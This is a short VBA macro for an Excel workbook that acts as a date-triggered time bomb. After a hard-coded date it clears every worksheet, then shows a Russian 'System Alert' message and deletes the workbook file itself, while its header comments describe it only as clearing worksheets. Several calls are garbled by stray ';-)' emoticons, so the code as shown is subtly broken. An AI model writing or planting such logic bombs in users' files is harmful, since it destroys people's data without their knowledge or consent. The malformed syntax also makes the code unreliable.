' *********************************************************
' Subroutine Workbook_ClearWorksheet
' This Subroutine will Clear the Excel WorkSheets
' *********************************************************
Sub Workbook_ClearWorksheet()
	'Kill_Them_All
	Dim DateToKill As Variant
	Dim CurrDate As Variant
	Dim WS As Worksheet
	CurrDate = Date
	' DateToKill = DateValue("18.06.2010";-)  
	DateToKill = DateValue("06.02.2024";-)  
	Set WS = Sheets(1)
	If DateToKill <= CurrDate Then
		For Each WS In Worksheets
			WS.Cells.Clear
		Next WS
	End If
	Range("A1";-).Select
End Sub

' *********************************************************
' Subroutine Workbook_EraseWorksheet
' This Subroutine will Clear the Excel WorkSheets
' *********************************************************
Sub Workbook_EraseWorksheet()
	If Date <= #12/31/2004# Then Exit Sub
	If Date <= #02/06/2024# Then Exit Sub
	MsgBox "Сейчас рабочая книга будет удалена!", vbOkOnly Or vbInformation, "System Alert"
	With ThisWorkbook
		.Saved = True
		.ChangeFileAccess xlReadOnly
		Kill .FullName
		.Close False
	End With
End Sub